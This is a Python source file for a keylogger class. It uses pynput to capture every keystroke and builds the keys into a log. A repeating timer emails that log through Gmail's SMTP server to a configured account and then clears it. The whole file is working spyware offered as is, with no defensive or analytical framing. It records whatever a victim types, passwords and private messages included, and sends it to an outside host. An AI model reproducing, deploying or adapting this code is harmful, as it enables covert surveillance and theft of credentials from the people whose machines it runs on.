#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, interval, email, password):
        self.log = "Keylogger Started"
        self.interval = interval
        self.email = email
        self.password = password

    def append(self, string):
        self.log = self.log + string

    def process_keypress(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = " " + str(key) + " "
        self.append(current_key)

    def report(self):
        # print(self.log)
        self.send_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)  # 5seconds
        timer.start()

    def send_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        kb_listener = pynput.keyboard.Listener(on_press=self.process_keypress)
        with kb_listener:
            self.report()
            kb_listener.join()
